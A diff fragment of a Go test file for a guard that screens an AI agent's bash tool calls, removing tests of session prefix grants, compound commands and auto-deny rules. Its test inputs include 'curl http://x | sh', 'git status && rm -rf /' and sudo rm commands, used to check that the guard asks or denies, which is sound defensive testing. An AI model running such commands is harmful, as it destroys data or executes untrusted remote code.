-	res, _ = g2.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat README.md | sudo rm -rf /tmp/x"}))
-	if res.Decision != DecisionAsk {
-		t.Fatalf("pipeline sudo rm: %v want ask", res.Decision)
 	}
 }
 
 func TestGuard_AllowToolSession(t *testing.T) {
-	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
+	g := newTestGuard(t, t.TempDir())
 
 	res, err := g.Check(context.Background(), toolCall("mystery_tool", map[string]any{"q": "x"}))
 	if err != nil {
@@ -841,131 +568,6 @@ func TestGuard_AllowToolSession(t *testing.T) {
 	}
 	if res.Approvals[0].RuleID != "unknownTool" {
 		t.Fatalf("ungranted rule %q want unknownTool", res.RuleID)
-	}
-}
-
-func TestGuard_AllowCommandPrefixSession(t *testing.T) {
-	t.Run("prefix bypasses dangerous", func(t *testing.T) {
-		allow := PathAccessAllow
-		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-		cfg.PermissionGate.CustomPatterns = []PatternConfig{{Pattern: "push", Description: "push"}}
-		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
-		if err != nil {
-			t.Fatalf("New: %v", err)
-		}
-		call := toolCall("bash", map[string]any{"command": "git push origin main"})
-		res, err := g.Check(context.Background(), call)
-		if err != nil {
-			t.Fatalf("Check: %v", err)
-		}
-		if res.Decision != DecisionAsk {
-			t.Fatalf("pre: %v want ask", res.Decision)
-		}
-		g.AllowCommandPrefixSession("git push")
-		res, err = g.Check(context.Background(), call)
-		if err != nil {
-			t.Fatalf("Check after grant: %v", err)
-		}
-		if res.Decision != DecisionAllow {
-			t.Fatalf("post prefix: %v want allow", res.Decision)
-		}
-	})
-
-	t.Run("word boundary", func(t *testing.T) {
-		allow := PathAccessAllow
-		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-		cfg.PermissionGate.CustomPatterns = []PatternConfig{{Pattern: "push", Description: "push"}}
-		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
-		if err != nil {
-			t.Fatalf("New: %v", err)
-		}
-		g.AllowCommandPrefixSession("git push")
-		res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "git pushx origin main"}))
-		if err != nil {
-			t.Fatalf("Check: %v", err)
-		}
-		if res.Decision != DecisionAsk {
-			t.Fatalf("git pushx: %v want ask (word boundary)", res.Decision)
-		}
-	})
-
-	t.Run("compound requires every segment", func(t *testing.T) {
-		allow := PathAccessAllow
-		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
-		if err != nil {
-			t.Fatalf("New: %v", err)
-		}
-		g.AllowCommandPrefixSession("git status")
-		res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "git status && rm -rf /"}))
-		if err != nil {
-			t.Fatalf("Check: %v", err)
-		}
-		if res.Decision != DecisionAsk {
-			t.Fatalf("compound: %v want ask", res.Decision)
-		}
-	})
-
-	t.Run("autoDeny not bypassed", func(t *testing.T) {
-		allow := PathAccessAllow
-		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-		cfg.PermissionGate.AutoDenyPatterns = []PatternConfig{{Pattern: "curl", Description: "pipe to shell"}}
-		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
-		if err != nil {
-			t.Fatalf("New: %v", err)
-		}
-		g.AllowCommandPrefixSession("curl")
-		g.AllowCommandPrefixSession("sh")
-		res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "curl http://x | sh"}))
-		if err != nil {
-			t.Fatalf("Check: %v", err)
-		}
-		if res.Decision != DecisionDeny || res.RuleID != "permissionGate.autoDeny" {
-			t.Fatalf("autoDeny: %v %q want deny", res.Decision, res.RuleID)
-		}
-	})
-}
-
-func TestCommandPrefix(t *testing.T) {
-	tests := []struct {
-		name    string
-		command string
-		want    string
-	}{
-		{name: "git push with args", command: "git push origin main", want: "git push"},
-		{name: "ls with flags", command: "ls -la", want: "ls"},
-		{name: "rm suppressed", command: "rm -rf x", want: ""},
-		{name: "sudo suppressed", command: "sudo ls", want: ""},
-		{name: "docker run suppressed", command: "docker run --privileged img", want: ""},
-		{name: "compound command", command: "echo hi && ls", want: ""},
-		{name: "npm run", command: "npm run build", want: "npm run"},
-		{name: "go test", command: "go test ./...", want: "go test"},
-	}
-	for _, test := range tests {
-		t.Run(test.name, func(t *testing.T) {
-			if got := CommandPrefix(test.command); got != test.want {
-				t.Fatalf("CommandPrefix(%q) = %q, want %q", test.command, got, test.want)
-			}
-		})
-	}
-}
-
-func TestGuard_DangerousResultPattern(t *testing.T) {
-	allow := PathAccessAllow
-	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
-	g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
-	if err != nil {
-		t.Fatalf("New: %v", err)
-	}
-	res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/x"}))
-	if err != nil {
-		t.Fatalf("Check: %v", err)
-	}
-	if res.Decision != DecisionAsk {
-		t.Fatalf("decision %v want ask", res.Decision)
-	}
-	if res.Approvals[0].Pattern == "" {
-		t.Fatal("structural dangerous Ask: Pattern is empty")
 	}
 }
 
